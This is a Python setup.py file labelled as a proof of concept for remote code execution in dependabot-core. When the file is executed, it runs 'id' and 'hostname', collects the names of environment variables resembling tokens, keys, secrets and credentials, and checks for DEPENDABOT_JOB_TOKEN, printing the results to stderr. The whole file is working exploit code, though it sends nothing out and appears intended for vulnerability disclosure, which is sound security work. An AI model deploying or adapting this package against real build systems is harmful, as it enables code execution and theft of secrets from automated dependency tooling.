from setuptools import setup
import subprocess, os, sys

sys.stderr.write("=" * 60 + "\n")
sys.stderr.write("[POC] dependabot-core exec(setup.py) RCE PROOF\n")
sys.stderr.write(f"[POC] Python: {sys.version}\n")

proc = subprocess.run(['id'], capture_output=True, text=True)
sys.stderr.write(f"[POC] id: {proc.stdout.strip()}\n")

proc2 = subprocess.run(['hostname'], capture_output=True, text=True)
sys.stderr.write(f"[POC] hostname: {proc2.stdout.strip()}\n")

sensitive = [k for k in os.environ if any(x in k.upper() for x in ['TOKEN','KEY','SECRET','CRED','DEPENDABOT'])]
sys.stderr.write(f"[POC] Sensitive env vars: {sensitive}\n")
sys.stderr.write(f"[POC] DEPENDABOT_JOB_TOKEN present: {'DEPENDABOT_JOB_TOKEN' in os.environ}\n")
sys.stderr.write("=" * 60 + "\n")

setup(name='poc-pkg', version='1.0.0', install_requires=['requests>=2.0.0'])
